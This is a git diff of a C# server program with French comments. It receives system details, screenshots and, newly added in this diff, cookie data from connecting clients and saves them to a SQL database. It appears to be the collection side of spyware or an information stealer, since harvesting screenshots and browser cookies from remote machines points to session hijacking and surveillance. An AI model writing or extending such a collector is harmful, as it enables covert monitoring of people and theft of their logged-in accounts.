@@ -64,13 +64,14 @@ namespace ServerTest
                     string processor = reader.ReadLine();
                     string ram = reader.ReadLine();
                     string disk = reader.ReadLine();
+                    string cookies = reader.ReadLine();
 
                     // Lire la capture d'écran envoyée par le client
                     string screenshotBase64 = reader.ReadLine();
                     byte[] screenshot = Convert.FromBase64String(screenshotBase64);
 
                     // Stocker les données dans la base de données
-                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot);
+                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot, cookies);
                     i++;
                     currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                     AddTextToInfoTextBox(" Les Données "+ i + " reçues et stockées dans la base de données a " + currentTime);
@@ -90,11 +91,11 @@ namespace ServerTest
         }
 
 
-        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot)
+        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot, string cookies)
         {
             // Connexion à la base de données et insertion des données
-            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData, receivedAt) " +
-                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot, @ReceivedAt)";
+            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData,cookies, receivedAt) " +
+                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot,@cookies, @ReceivedAt)";
 
             using (SqlConnection cnx = Program.GetSqlConnection())
             {
@@ -106,6 +107,7 @@ namespace ServerTest
                     command.Parameters.AddWithValue("@RAM", ram);
                     command.Parameters.AddWithValue("@Disk", disk);
                     command.Parameters.AddWithValue("@Screenshot", screenshot);
+                    command.Parameters.AddWithValue("@cookies", cookies);
                     command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now); // Utilisation de la date et l'heure actuelles
 
                     cnx.Open();
